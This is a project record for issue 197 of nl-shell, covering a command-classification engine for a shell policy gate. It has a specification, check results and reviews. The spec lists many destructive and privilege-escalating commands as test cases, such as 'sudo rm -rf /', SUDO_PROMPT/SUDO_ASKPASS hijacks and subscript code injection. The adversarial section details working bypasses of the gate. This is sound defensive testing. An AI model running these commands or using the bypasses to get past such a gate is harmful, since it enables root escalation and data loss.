# Result — issue 197 / ast-policy-gate-command-engine

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: On `main` (`1a1e980`, #196 merged) the gate's command layer is a stub:
  `src/nl_shell/gate/rules.py:26-28` returns `mutating`, "not allowlisted" for every simple
  command. So `rm -rf build` is not `destructive`, `sudo apt update` is not `privileged`,
  `sudo -S true` is not rejected, and none of spec §3–§5's per-command rules fire. Add the
  **command layer**: a reviewed data table `targets/ubuntu-26.04/commands.toml` (format,
  loader, rows) and one generic engine in `gate/rules.py` that reads it. Wrappers, the sudo
  family, destructive commands, interpreters and builtins are data rows, not code paths.
  Each row gives the command's argv grammar (flags; value-taking options in short, attached
  and long `=` forms; end-of-options; where an inner command starts) and its effects from
  one fixed set: `runs-command-at`, `runs-text`, `runs-stdin-as-code`, `runs-file-as-code`,
  `stores-code`, `sets-variable`, `elevates`, `destroys` (with a condition),
  `reads-terminal`, `opens-shell`. Do may refine the effect names, but every rule below must
  be expressible in the table.

  **Decisions** (agreed in the #189 split plan, `results/issue_189/brief.md:99-112` in the
  pdca checkout):
  - **A**: an opaque command (no `commands.toml` row and no allowlist entry) is at least
    `mutating`, "not allowlisted". If any argument word, after quote removal, names a row
    with `elevates`, the command is `privileged` and a proposal is rejected. If one names a
    row with `destroys`, it is at least `destructive`.
  - **B**: code the gate cannot read (`runs-stdin-as-code` fed by a pipe or file;
    `runs-text` whose text is not literal or not in a grammar the gate parses;
    `runs-file-as-code`) is at least `destructive`, reason "runs code the gate cannot read".
    Literal text in a grammar the gate parses is classed recursively, within the budget.
    **Recursion runs the whole pipeline, not only `rules`.** Inner text goes through the
    same steps as the outer command (`gate/__init__.py:159-210`: §1.1 characters,
    `shell_layer`, untrusted features, `_redirects`, `_assignments` (where the
    `SUDO_PROMPT` rejection is, `:229-244`), `_shell_rules`, `rules.classify`, `live`,
    `sensitive`, `words`). So `bash -c 'export SUDO_PROMPT=x'` is rejected. The recursion
    entry point is `gate._classify`, or a function pulled out of it that takes the shared
    budget (below) and gives back a verdict. `rules.py` must not import `gate/__init__.py`
    (it is imported by it, `:31`). Either `rules.classify` returns "class this text in
    grammar G" and `__init__.py` does the recursion, or `__init__.py` passes in a callback.
    Do picks one and says which in build notes.
    **Shared work budget.** Today every `shell_layer` call builds a new `Walker` with
    `work = 0` (`parse.py:516`, `:1077`), so each nested layer gets its own `MAX_WORK`. The
    budget has to be one counter for the whole top-level `classify` call. The one
    `parse.py` change in scope: `shell_layer(source, *, budget=None)` takes an optional
    shared counter that `Walker.visit` (`:526-528`) adds to. When it is `None` you get
    today's behaviour. The recursion passes the outer call's counter to each inner call.
  - **C**: a gate failure (unhandled node, work budget used up, missing or invalid
    `commands.toml`, internal error) is `privileged`, rejected, reason "could not class".
    #196 already implements this (`src/nl_shell/gate/__init__.py:18-19`, `:48`, `:143`);
    this bundle sends its own failures there.

  **The seven bypass classes.** Each one is an invariant the engine must hold for every
  row. The v1/v2 findings are instances of these classes, listed as regressions in the
  success criterion.
  1. **Coverage.** Every binary on the target that elevates, or that runs a shell or an
     interpreter, has a row. That includes every alias name pointing at the same file as
     such a binary (`sudo-rs`, `sudo.ws`, `sudoedit-rs`, `su-rs` →
     `/usr/lib/cargo/bin/{sudo,su}`). The checked-in inventory (below) is the list a test
     checks this against.
  2. **No unread argv.** No row skips argv parsing (v2's `raw = true` rows are gone). An
     option a row does not declare is **never** read as a harmless flag: the command is at
     least `destructive`, reason "option the gate does not know". On a row with `elevates`,
     a proposal with such an option is also rejected. A row may describe only some
     subcommands (`git clean|reset|push`). Other subcommands get the row's stated default,
     at least `mutating`, so floor rows 8 and 27 stay as the spec says. **One named
     exception to this class:** the code-running options of the class-7 floor commands
     (`git`'s global `-c`/`--config-env`/`--exec-path`, and `tar --to-command`/`ssh -o` if
     those get rows) are declared on the row with a `class-7-gap` marker, not as harmless
     flags. They give the row's default (`mutating`, "not allowlisted"), not `destructive`.
     The loader accepts `class-7-gap` only on options named in the spec's class-7 text,
     and refuses it anywhere else. Every other undeclared option on these rows still
     follows the rule above. A row whose effects
     do not depend on argv (e.g. a non-elevating setuid binary such as `passwd`) may say so
     and give a fixed class (at least `mutating`). The undeclared-option rule then does not
     apply, but decision A still runs over its words. Every row that runs
     an inner command declares what it does when no command is given (for example
     `chroot`/`unshare` start `$SHELL`) and when stdin is the terminal (`bash -s x`,
     `bash /dev/stdin`). The loader refuses a row that leaves either one undeclared.
  3. **Grammar.** Every text effect names the grammar its text is read in: `bash`,
     `env-split` (uutils env 0.10.0 `-S`), `arithmetic` (bash arithmetic and `name[subscript]`
     evaluation), or another named one. The engine classes text only with a parser for that
     grammar. Text in any other grammar, or text the parser cannot fully translate, is
     decision B. bash is a parsed grammar. `env-split` is parsed, so `env -S 'sudo -i'` and
     `env -S '\_sudo -i'` are seen as `sudo -i`. Any escape it cannot translate (for example
     `${VAR}`) is decision B. In `arithmetic`, any `$`, backtick or `$(` in a subscript or
     value is decision B, and a name assigned inside the expression (`x=SUDO_PROMPT=1`)
     counts as a variable write under class 5. Every word bash evaluates as arithmetic or as
     a subscripted name is in the `arithmetic` grammar: `declare`/`typeset`/`local -i`
     values, `let`, and the name operands of `unset`, `test -v`/`[ -v`, `printf -v`, `read`,
     `mapfile`/`readarray`, `getopts`, `wait -p` and `declare`.
  4. **Run-time command words.** Every word that can reach command position when the command
     runs goes through the command-word check (decision A over it). That covers the words
     after `-c` text (they become `$0`, `$1`, …), the words after a script operand or
     `bash -s`, the literal arguments around `{}` in `find -exec`/`xargs`, and a non-literal
     inner command word.
  5. **Protected variables.** Every row that takes variable names marks which operands or
     option values are names. Changing the value of `SUDO_PROMPT`/`SUDO_ASKPASS`, exporting
     them, or making a nameref point at them is rejected, with or without `=` (`export
     SUDO_PROMPT`, `declare -x`, `typeset -x`, `readonly -x`, `local -x`, `declare -n`). The
     same forms on a §3 session name (`PATH`, `LD_*`, …) are at least `session-altering`.
  6. **Stored code.** Text kept to run later is classed as if it ran now, in its own
     grammar: `trap` text, `alias` values, `complete -C` text, the command part of
     `bind -x '"keys":cmd'` (decision B if it cannot be split), `mapfile -C` text, and
     the values of `PROMPT_COMMAND` (scalar or array) and `PS0`–`PS4` (a `$(…)`/backtick
     in a prompt string is classed as bash text). This holds however the value is set: a
     plain assignment, `export`/`declare`, or `printf -v`. A file that will be run later
     (`BASH_ENV=`, `ENV=`, `enable -f x.so`) is decision B.
  7. **Real text-runners get rows. The leftover gap is written down.** Every text-runner on
     the target inventory gets a row with its text effects: `busybox` (applet = inner
     command), `python3`, `perl`, `tclsh`, `gjs`, `gdb -ex`, `screen`. Rows are also added
     by name for runners the reviews found that this host lacks: `sg`/`newgrp`
     (`runs-text`, sh), `at`/`batch` (`runs-stdin-as-code`), `zsh`, `tmux`,
     `x-terminal-emulator -e`. Interpreter text in a grammar the gate does not parse
     (python, perl, tcl, js) is decision B. One gap is accepted and written into the spec
     and threat model: an unknown command that takes command text as one quoted word
     (`foo 'sudo -i'`). The same goes for code-running options of commands the spec leaves
     at the floor (`git -c core.pager=sh`, `tar --to-command=sh`, `ssh -o ProxyCommand=sh`,
     rows 8/10/11). These stay `mutating` "not allowlisted" and go to the confirm prompt.
     Decision A does not split quoted words.

  **Inventory.** `scripts/harvest_inventory.py` (style of `scripts/gen_unicode_tables.py`)
  writes `targets/ubuntu-26.04/inventory.toml` from this Ubuntu 26.04.1 host:
  - setuid/setgid/file-capability binaries in `/usr/bin`, `/usr/sbin`, `/usr/lib/cargo/bin`;
  - every name in those folders whose `realpath` is the same file as a listed binary or a
    row's binary;
  - `/etc/shells`;
  - the binaries of dpkg packages in sections `shells` and `interpreters`;
  - `python3*`, `perl*`, `busybox`, `gdb`.

  The file is checked in and reviewed like an allowlist change. The script records the
  host's `VERSION` line and is not run by any test. On this host today: 20 setuid/setgid
  binaries (e.g. `pkexec`, `su`, `sudo.ws`, `/usr/lib/cargo/bin/{su,sudo}`, `passwd`,
  `chsh`, `crontab`, `mount`); `/etc/shells` lists `sh`, `bash`, `rbash`, `dash`, `screen`.
  A row for a setuid binary that does not elevate (for example `passwd`) may just say so.
  What the check requires is that a row exists, so someone has reviewed it.

  Write the command table, decisions A–C, the seven class rules and the class-7 accepted
  gap into the spec (`docs/design/specs/policy-gate/v1.md` §4/§5 and a new §4.1) and the
  threat model (`.oss-scanner/threat_model.md:171-195`, the gate paragraph that still says
  "The command layer … still stubs").
- Success criterion: `tests/test_gate_commands.py` passes. Every case goes through the
  public `nl_shell.gate.classify(cmd, origin=...)`. Case groups:
  - **Class 1, coverage (property).** Every name in `targets/ubuntu-26.04/inventory.toml`
    has a `commands.toml` row. So the inventory cannot quietly shrink, the test also checks
    that it lists at least these names: `sudo`, `sudo.ws`, `sudo-rs`, `sudoedit-rs`, `su`,
    `su-rs`, `pkexec`, `passwd`, `chsh`, `crontab`, `mount`, `sh`, `bash`, `rbash`, `dash`,
    `screen`, `python3`, `perl`, `busybox`, `gdb`. Reviewer check at Check: re-run
    `scripts/harvest_inventory.py` on this host and diff it against the checked-in
    `inventory.toml`. Any difference is a finding. Regressions: `sudo-rs -i`, `sudo.ws -i`, `su-rs`,
    `/usr/bin/sudo-rs -i`, `sudoedit-rs /etc/shadow` are `privileged`. As proposals the
    first four are rejected. `echo pw | sudo-rs -S true` is rejected. `foo sudo-rs` is
    `privileged` and rejected as a proposal (decision A). `sg adm -c 'sudo -i'`,
    `busybox sh -c 'sudo -i'` as proposals are rejected (by recursion, as `bash -c 'sudo
    -i'`). `at now <<<'sudo rm -rf /'` is `privileged` (literal stdin, classed by
    recursion). `echo 'sudo rm -rf /' | at now` is at least `destructive` (decision B,
    piped stdin).
    `curl x | python3`, `python3 -c "$v"`, `perl -e 'system 1'` are at least `destructive`,
    "runs code the gate cannot read". `sudo zsh`, `sudo busybox sh` as proposals are
    rejected (root shell).
  - **Class 2, unread argv (property).** The loader refuses a row with `raw`, an unknown
    key, or a `runs-command-at` row with no no-command/terminal-stdin declaration. Every row
    carries a minimal example invocation. For every row that reads argv, that example plus
    an undeclared option (a test-chosen string such as
    `--pdca-undeclared`) is at least `destructive`, "option the gate does not know". The
    option goes **right after the command word**, before any operand, option value or
    inner command (`sudo --pdca-undeclared true`, `timeout --pdca-undeclared 5 true`), so
    it is the row's own option and not one of the inner command's arguments. For a row that
    describes subcommands, there is one more case with the option right after each described
    subcommand (`git clean --pdca-undeclared`). `class-7-gap` options (class 2's exception)
    are not undeclared and are tested in the floor group. For
    every row with `elevates` it is also rejected as a proposal. For every row declaring
    "opens a shell with no command", `sudo <row example with no command>` as a proposal is
    rejected. Regressions: `getopts -- x SUDO_PROMPT` rejected;
    `mapfile -C 'rm -rf ~' -c 1 a < f` at least `destructive`; `mapfile -C 'sudo -i' -c 1 a
    < f` rejected; `enable -f /tmp/x.so foo` at least `destructive`; `wait -p SUDO_PROMPT`
    rejected. As proposals these are rejected (root shell): `sudo bash -s x`,
    `sudo bash -is x`, `sudo dash -s x`, `sudo env bash -s x`, `pkexec bash -s x`,
    `sudo bash /dev/stdin`, `sudo chroot /`, `sudo unshare`.
  - **Class 3, grammar (property).** For every row field in the `arithmetic` grammar,
    putting `'a[$(rm -rf ~)]'` there gives at least `destructive`, "runs code the gate
    cannot read". For every text effect in an unparsed grammar, literal text is decision B.
    Regressions: `env -S 'sudo -i'`, `env -S 'sudo\_-i'`, `env -S '\_sudo -i'`,
    `env -S '\_sudo\_-i'`, `env -S '-i\_sudo\_-i'` as proposals are `privileged` and
    rejected. `env -S 'rm\_-rf\_/'` is at least `destructive`. `env -S '${X}'` is decision
    B. These are at least `destructive`: `declare -i x='a[$(rm -rf ~)]'`,
    `a=(1); unset -v 'a[$(rm -rf ~)]'`, `test -v 'a[$(rm -rf ~)]'`,
    `printf -v 'a[$(rm -rf ~)]' x`. As proposals these are rejected:
    `typeset -i x='a[$(sudo -i)]'`, `unset 'x[$(sudo -i)]'`, `declare -i x=SUDO_PROMPT=1`.
  - **Class 4, run-time command words (property).** For every row with a `runs-text`
    effect that passes later words as positional parameters, `<row> '"$@"' _ sudo -i` (or
    the row's equivalent form) as a proposal is rejected. Regressions (proposals): `sh -c
    '$0 -i' sudo` and `bash -c '"$0" -S true' sudo` rejected; `sh -c '"$@"' _ rm -rf ~` at
    least `destructive`; `bash -s _ sudo -i <<<'"$@"'` and `bash /dev/stdin sudo -i
    <<<'"$@"'` rejected; `find /usr/bin -name sudo -exec {} -i \;` rejected;
    `printf rm | xargs -I% % -rf ~` at least `destructive`.
  - **Class 5, protected variables (property).** For every row field marked as a name,
    putting `SUDO_PROMPT` there gives a rejection as a proposal, and `PATH` gives at least
    `session-altering`. Regressions (rejected): `export SUDO_PROMPT`,
    `export "SUDO_PROMPT"=x`, `declare -x SUDO_ASKPASS`, `typeset -x SUDO_PROMPT`,
    `readonly -x SUDO_PROMPT`, `local -x SUDO_PROMPT` (inside a function body),
    `declare 'SUDO_ASKPASS'=/x`, `declare -n r=SUDO_ASKPASS; r=/x`,
    `printf -v SUDO_ASKPASS /x`, `read SUDO_PROMPT <<<x`, `mapfile SUDO_PROMPT <x`,
    `getopts x SUDO_PROMPT`, `let SUDO_ASKPASS=1`, `wait -p SUDO_PROMPT`. The same
    forms naming `PATH` or `LD_PRELOAD` are `session-altering`. `export "SUDO_PROMPT"=x` and
    `declare 'SUDO_ASKPASS'=/x` are **already rejected on `main`** (checked at Plan:
    `_declared`, `parse.py:813-828`, then `__init__.py:236-237`). They are pinned against
    regression and are not part of the red-leg claim. Put them in their own test function
    (for example `test_class5_pinned`) so Check does not read a stub pass there as a test
    defect.
  - **Class 6, stored code (property).** For every row with a `stores-code` effect, the
    row's example with stored text `sudo -i` as a proposal is rejected, and with
    `rm -rf ~` it is at least `destructive`. Regressions: `trap 'rm -rf ~' EXIT` at least
    `destructive`. These are rejected as proposals: `trap -- 'sudo -i' EXIT`,
    `alias ls='sudo -i'`, `export PROMPT_COMMAND='sudo -i'`, `PROMPT_COMMAND='sudo -i'`,
    `PROMPT_COMMAND=('sudo -i')`, `PS1='$(sudo -i)'`. These are at least `destructive`:
    `complete -C 'rm -rf ~' x`, `bind -x '"\C-x":rm -rf ~'`, `BASH_ENV=/tmp/x`.
    `alias ll='ls -l'` (row 33) stays `session-altering`, never lower.
  - **Class 7, accepted gap (documented, not raised).** `foo 'sudo -i'` is `mutating`,
    "not allowlisted", and so are floor rows 8, 10, 11, 27 (`git -c core.pager=sh log`,
    `git status`, `tar --to-command=sh -xf a.tar`, `ssh -o ProxyCommand=sh h`). These sit in
    a test function named for the floor group. They are not part of the red-leg claim,
    since the stub gives the same answer. The spec states the gap.
  - **Spec §4 privileged:** row 24 (`sudo apt update`) `privileged`; `su`, `pkexec`,
    `doas`, `run0`, `machinectl shell`, `machinectl shell root@`; `//usr/bin/sudo true`
    `privileged`, never lower.
  - **Spec §4 destructive:** row 26 (`rm -rf build`), row 17 (`"r"m -rf ~`), row 18
    (`ls; rm -rf ~`), row 29 (`systemctl stop ssh`), row 9 (`find . -exec rm {} \;`), and
    `dd`, `mkfs.ext4`, `wipefs`, `shred`, `truncate`, `chmod -R`, `find -delete`,
    `git clean`, `git reset --hard`, `git push --force`, `kill -9 -1`. Row 9 is derived
    (record it in the spec): `{}` is a non-literal operand of the inner command, and `rm`
    with a non-literal operand is classed like `rm` with a glob (§4) ⇒ `destructive`.
  - **Spec §4 wrappers (property + regressions).** Every row with `runs-command-at` carries
    a minimal example prefix (e.g. `timeout 5`). For every such row, `<prefix> rm -rf x` is
    at least `destructive` and `<prefix> sudo -i` as a proposal is `privileged` and
    rejected. Named: `env rm -rf x` (row 32) `destructive`; `nice`, `nohup`, `timeout`,
    `time`, `xargs`, `watch`, `bash -c`, `sh -c` take the inner class and are at least
    `mutating`; `xargs`/`find -exec` with a non-literal inner command at least
    `destructive`. These proposals are `privileged` and rejected (typed: `privileged`):
    `env - sudo -i`, `env 'A=1' sudo -i`, `env -a x sudo -i` (uutils env 0.10.0 takes a
    value for `-a`/`--argv0`), `exec -a x sudo -i`, `nice -n5 sudo -i`,
    `timeout -s9 5 sudo -i`, `stdbuf -o0 sudo -i`, `setsid sudo -i`, `flock /tmp/l sudo -i`,
    `script -c 'sudo -i'`. `env - rm -rf ~` is `destructive`. Ten nested `env`s around
    `sudo -i` as a proposal: `privileged` and rejected, never lower.
  - **Spec §5 sudo rules.** Rejected: row 21 (`sudo -S true`, `sudo -p x true`,
    `sudo -A true`); row 22 (`echo pw | sudo -S true`); `sudo "-S" true`; `sudo $'-S' true`;
    `sudo "$P" true`; `sudo -s <<<x`; `printf x | sudo -i`; a pipe, here-doc or here-string
    into `sudo`, `su`, `pkexec`, `doas`; `cat <<E | sudo tee /x` and `cat <<E | doas id`
    (with the pipe reason). Proposals `sudo -i`, `sudo -s`, `sudo su`, `sudo bash`, bare
    `su`, `pkexec bash` are rejected; typed, they are `privileged`.
  - **Spec §3 builtins.** Row 33 and `unalias`, `source`, `.`, `eval`, `exec`, `trap`,
    `enable`, `set`, `shopt`, `bind`, `complete`, `hash`, `builtin`, `command` (except
    `command -v`/`-V`, `v1.md:101`), `export`, `declare`/`typeset`/`local`/`readonly` with
    assignments, and `unset` are at least `session-altering`.
  - **Decision A:** `foo sudo x` is `privileged` and rejected as a proposal; `foo rm -rf x`
    is at least `destructive`.
  - **Decision B:** `x | sh`, `bash < f`, `bash f.sh`, `bash -c "$v"`, `eval "$v"`, `. ./f`,
    `echo 'sudo rm -rf /' | bash` are `destructive`, "runs code the gate cannot read".
    `bash -c 'rm -rf ~'`, `bash <<<'rm -rf ~'`, `bash -s <<<'rm -rf /'`,
    `. /dev/stdin <<<'rm -rf /'` and a quoted here-doc running `rm -rf ~` are `destructive`
    by recursion. `bash <<<'sudo ls'` as a proposal is rejected. `bash -c 'true'` is not
    raised by decision B (floor group).
  - **Work budget.** `{ bash;bash;bash;bash; } <<'E0'` nested nine deep (about 320 bytes;
    v2 grew ×4 per level) gives a result never below `mutating` (decision C if the budget
    runs out), under a loose 10 s timeout that only guards against a hang. Sharing is
    tested through the public API by its effect, not by reading a counter (`Result`,
    `__init__.py:83-88`, has no work count, and none is added). The test builds one text
    `T` (for example a run of `:;`, sized by the test from `MAX_WORK`) that `bash -c 'T'`
    classes normally on its own, with no "could not class". `bash -c 'T'; bash -c 'T';
    bash -c 'T'` (still under the 8 KiB input cap) must then be decision C, "could not
    class", because the inner walks add up past `MAX_WORK`. On the stub this case is
    `mutating` with no "could not class", so it goes red. Do may change the size of `T` or
    the repeat count, but must keep "alone fits, together does not".
  - **Decision C on table failure.** A missing or invalid `commands.toml` gives decision C
    for every command, never a silent `mutating`.
  - **Fixed load location.** The loader takes no path argument. It reads
    `TARGETS_ROOT / <id> / "commands.toml"` (`src/nl_shell/targets.py:28`) and refuses a
    resolved path outside that root, as `targets.py:153-155` does. **`<id>` is a
    module-level constant, `"ubuntu-26.04"`**, in the loader module. v1 ships one target,
    and `classify()` (`__init__.py:147`) has no target argument. Choosing the target from
    `/etc/os-release` (`targets.select`, `:249`) is out of scope: it would make the gate's
    answer depend on the host file. **Test seam for the missing/invalid-table cases:** the
    test monkeypatches the loader module's root constant to a `tmp_path` holding a missing
    or broken `commands.toml`, and clears the loader's cache if it has one. That is the only
    seam. It is a test-time patch of a module attribute, not an env/cwd/config read, so it
    does not break the reviewer check below. Reviewer check: no
    `os.environ`, `Path.cwd()`, `Path.home()` or config read in the loader. Test: with a
    `commands.toml` in the test's cwd that says `sudo` is harmless, and `NL_SHELL_COMMANDS`,
    `NL_SHELL_TARGETS`, `XDG_CONFIG_HOME` pointing at a folder holding such a file,
    `sudo -i` stays `privileged`.
  - **Assertions.** Every case asserts the class (or a floor), a reason substring, and that
    no reason is "could not class". The exceptions: the missing/invalid-table cases assert
    "could not class"; the ten-`env` and budget cases accept the engine's reason or "could
    not class", but never a class below the one stated.
- Repo + branch target: eduralph/nl-shell @ main
- Scope (one logical fix) / out of scope: The command layer as above. Files in scope:
  - `src/nl_shell/gate/rules.py` (engine, replacing the stub);
  - a `commands.toml` loader in the style of `src/nl_shell/targets.py:145-247`;
  - `targets/ubuntu-26.04/commands.toml`;
  - `targets/ubuntu-26.04/inventory.toml` and `scripts/harvest_inventory.py`;
  - `gate-vectors.toml` rows for this child;
  - `src/nl_shell/gate/__init__.py`: (a) the `rules.classify` call at `:196` gets the
    origin. `Invocation` already carries `assignments` (`parse.py:805`), which class 6
    reads for plain `PROMPT_COMMAND=`, `PS1=`, `BASH_ENV=`. (b) The recursion entry point
    (decision B): `_classify` (`:159-210`) is restructured so inner text re-enters the full
    pipeline with the shared budget, without a `rules` → `gate` import cycle. Assignments
    with no simple command are out of scope (below);
  - `src/nl_shell/gate/parse.py`: **only** the shared-budget seam, an optional
    `budget` argument on `shell_layer` (`:1070`) that `Walker` (`:516`, `:526-528`) counts
    into. No other walker change, except the walker-bug escape hatch below;
  - spec and threat-model text (raises only);
  - `tests/test_gate_commands.py`.

  Out of scope:
  - the walker and stdin context (#196), apart from the `shell_layer` budget seam named
    above. Fix there only if a case here exposes a walker bug, and say so in build notes;
  - assignments and expansions with no simple command: `(( SUDO_ASKPASS=1 ))`,
    `for SUDO_PROMPT in x`, `: ${SUDO_ASKPASS:=/x}`, `[[ -v 'a[$(…)]' ]]`, `x=sudo; $x -i`.
    These are walker work; the human files a follow-up;
  - the allowlist, the terminal-read rule, the here-doc exemption (#198);
  - §7 (#192); §8 and the "`>` truncates an existing file outside the cwd" rule (#190);
  - mixed-script words (#191); confirm UI (#74); REPL wiring (#78); sudo passthrough (#13);
  - `systemd-run --user -M root@.host` (unconfirmed in v1; follow-up only if checked in
    the reference VM).

  Do not reuse `src/nl_shell/failure_classes.py:199` `is_privileged`. Its name list at
  `:97-99` may be cited as a cross-check for class 1.

  **Review contract:** Check's reviewers test the seven class rules. A bypass inside one of
  these classes is a defect in this bundle. A bypass that fits no class here goes to a
  follow-up issue and does not by itself reject this bundle.

## 2. Disposition claimed               ← sign-off confirms or overrides
- Outcome: new-feature
- Confidence: medium
- Recommendation: (set by Do)

## 3. Correctness (Check — chain)
- C1 Spec: none — brief.md
- C2 Reproduction (red pre-fix): none — (no gate configured)
- C3 Change: none — patch.diff
- C4 fix verified: bundle test red pre-fix, green post-fix (pytest): pass — C4 PASS — red without the fix (38 of 206 failed), green with it
- C5 Causal adequacy: none — reviewer + human sign-off

## 4. Conformance (Check — stack)
- T1 Structure: none — (no gate configured)
- T2 security-relevant change also updates the threat model: pass — security-relevant paths touched and the threat model updated: docs/design/specs/policy-gate/v1.md src/nl_shell/gate/__in
- T3 runtime: the whole nl-shell pytest suite on the patched worktree: pass — T3 PASS — nl-shell suite green
- T4 PR body has a user-impact opener + tracker id in both artifacts: deferred — pr-description.md not drafted yet — the substantive T4 audit of the contribution artifacts runs at publish
- T5 Judgment: none — reviewer + human sign-off
- T5 judgment: → see §5.

## 5. Advisory review (artifact-only, decorrelated)
Reviewer ran without build-notes.md. Summary:

Review issue #197: replace the policy gate’s command stub with a reviewed command table and generic engine enforcing the seven bypass classes.

| Item | Verdict | Basis |
|------|---------|-------|
| C1 Spec | PASS | The accepted bundle defines class-wide invariants, explicit floors and excluded walker work, providing a falsifiable scope; target/docs/design/specs/policy-gate/v1.md:167. |
| C2 Reproduction (red pre-fix) | PASS | Frozen execution demonstrates the stub misses the requested behaviors: 38/206 runtime failures, with no collection errors; gate-logs/C4-verify.log:16. |
| C3 Change | FAIL | Target selection must stay fixed to ubuntu-26.04: scanning directories instead makes an additional installed target disable classification and permits a different sole target, contrary to the brief’s explicit constant requirement; target/src/nl_shell/gate/commands.py:62. |
| C4 Verification (red→green) | PASS | Captured real pytest execution shows 206 green and 38 red tests, supporting the asserted regression coverage, though local pytest/parser dependencies prevent an independent repeat; gate-logs/C4-verify.log:10. |
| C5 Causal adequacy | NEEDS-HUMAN [impl] | Close the class-3 nameref subscript omission: declare -n r='x[$(sudo -i)]'; r=1 can execute uninspected arithmetic, because only the target’s base name is checked; target/src/nl_shell/gate/rules.py:727. |
| T1 Structure | PASS | Reviewed row data, a validating loader, and callback-based recursion keep command semantics centralized without a rules-to-package import cycle; target/src/nl_shell/gate/__init__.py:161. |
| T2 Shape | PASS | The security contract and threat model describe the new engine and accepted gaps; independent inventory regeneration is byte-identical, grounding coverage in this host; target/.oss-scanner/threat_model.md:196. |
| T3 Runtime | PASS | The frozen full-suite run reports 1,399 passed, one skipped and five forkpty warnings; this is captured execution evidence, not an independent local rerun; gate-logs/T3-suite.log:41. |
| T4 Contribution | N/A | Contribution artifacts are absent by design and the substantive audit must rerun at publish; gate-logs/T4-contribution.log:10. |
| T5 Judgment | NEEDS-HUMAN | Confirm path-based merged and closed/rejected prior-art coverage: the brief reports it, but the supplied git history contains only a synthetic base and no independent tracker evidence; brief.md:379. |
| Validation — fitness-to-purpose | NEEDS-HUMAN | Accept the command-table risk and class-7 confirmation-floor exception for this milestone, including the explicit git/tar/ssh code-running gaps; brief.md:402. |

Evidence and actionable concerns:

- The target is readable and contains the patch; no stale-target caveat applies. No production file was edited. Local `python3 -m pytest tests/test_gate_commands.py tests/test_policy_gate.py -q` cannot start because pytest is absent; importing tree_sitter also fails. Therefore no stash/red/restore cycle was attempted. The frozen C4 and T3 logs show actual parser-backed execution on the gate host, so those dependencies were exercised there; the local limitation does not invalidate those logs.
- Independently ran `python3 scripts/harvest_inventory.py --output /tmp/pdca-review-8p_pgvah/inventory-rerun.toml` from the target. It completed on Ubuntu 26.04.1 and its output is byte-identical to target/targets/ubuntu-26.04/inventory.toml. The threat-model touch requirement also matches the patch and gate-logs/T2-threat-model.log:10.
- The C5 finding has limited but direct independent evidence: loading the actual rules/commands modules with inert tree-sitter import placeholders (no parser or public API exercised), then passing literal Word objects for `declare -n r='x[$(sudo -i)]'`, returns `Verdict(cls='session-altering', reasons=('declare sets variables', 'not allowlisted'), rejected=False)`. The code discards the parsed nameref subscript at target/src/nl_shell/gate/rules.py:730. A harmless real Bash probe, `bash -c 'declare -n r='"'"'x[$(printf NAMEREF_EXECUTED >&2; printf 0)]'"'"'; r=1'`, printed `NAMEREF_EXECUTED`, confirming execution on the later write. This falls within the named arithmetic/name class, rather than an unrelated follow-up. Inspect the nameref target subscript with the arithmetic rules and add a public classify regression for the full declaration-plus-write command; verify at least destructive with the unread-code reason and no decision-C fallback. The public-API outcome remains to be verified with the real parser; the isolated probe is not claimed as that verification.
- Restore the agreed fixed target constant or explicitly obtain a scope decision before changing selection semantics. The issue is visible directly at target/src/nl_shell/gate/commands.py:71; the brief expressly requires the literal constant at brief.md:283.
- Prior-art investigation: `git log --all --oneline -- src/nl_shell/gate/rules.py targets/ubuntu-26.04/commands.toml tests/test_gate_commands.py` returns only `cadda0f pre-fix base 1a1e980613a41278e629658915febf541adde057`. That cannot independently establish merged history or closed/rejected work. No INTEGRATION.md is supplied in the target, so its human-only checklist cannot be inspected.
- The optional recursion callback checks support legitimate standalone fail-closed operation; no capability probe shielding an eager load-time side effect was found. The C5 concern above is an implementation omission, not a contested root-cause decision.

<!-- pdca:leaf-complete -->

### Advisory — adversary

# Adversarial review — issue 197 (ast-policy-gate-command-engine)

All cases below were run through the public `nl_shell.gate.classify(cmd, origin="proposal")` on the patched tree at `$PDCA_TARGET`, using the pdca venv. Where a finding depends on bash behaviour, I confirmed that behaviour with this host's bash 5.3.9.

## Evidence: I tried to refute it and could not

- C4 red→green holds (`gate-logs/C4-verify.log:1167-1207`). 38 of 206 fail on the stub, and every non-floor group in `tests/test_gate_commands.py` is among the failures. Each failure is either an ImportError raised inside a test function at run time or an AssertionError. There are no collection errors, so this is not an UNVERIFIABLE red. The tests go through the production `classify`, not a copy of it.
- The changed expectations in `tests/test_policy_gate.py` only raise classes (for example `rm -rf />/dev/null` goes from mutating to destructive, and `cat <<E | sudo tee /x` becomes rejected). None are lowered.
- The budget test (`tests/test_gate_commands.py:686-694`) checks "alone fits, three together give could not class" through the public API, as the brief asks.
- I re-ran `scripts/harvest_inventory.py --output <sandbox>` on this host. It is byte-identical to the checked-in `targets/ubuntu-26.04/inventory.toml`.
- I tried about 300 bypasses inside the classes, and these all held: sudo option clustering (`-iS`, `-Si`), getopt long-option prefixes (`sudo --std`, `--prom=x`, `env --spl=`), `sudo -u -S` (`-S` as the user value, correctly not rejected), `/dev/fd/0`, `/proc/self/fd/0`, `bash -`, `compgen -C`, `bind -m vi -x`, `mapfile -tC`, `read -a 'a[$(…)]'`, `printf -v PS1`, `declare -n r=PS1`, sudo/pkexec/run0/doas wrapping a shell through env/nice/timeout/find/xargs, and `"$@"`/`$0`/`${@:1}` with literal positionals.

## Refutations: bypasses inside the brief's classes

- NEEDS-HUMAN [impl] — **Class 3, `[ -v` is not covered.** `src/nl_shell/gate/__init__.py:216-218`: `[ -v 'a[$(sudo -i)]' ]` as a proposal comes out `mutating`, not rejected, with the reason "no simple command to class". `[ -v 'a[$(rm -rf ~)]' ]` is also only `mutating`. The brief's class 3 names `test -v`/`[ -v` explicitly (brief.md:93). `test -v` is handled, but the `[ … ]` form is parsed as a test node with no Invocation, so the engine never sees it. Bash really runs the code: `a=(1); [ -v "a[\$(echo RAN1 >&2)]" ]` prints RAN1. The tests only cover `test -v`, so the property test missed this. Fix: send `[ … ]` through the `test` row, or treat a `[`-test whose operands hold `$`/backtick inside a subscript as decision B. This is the single-bracket builtin. `[[ … ]]` is out of scope and is a different case.
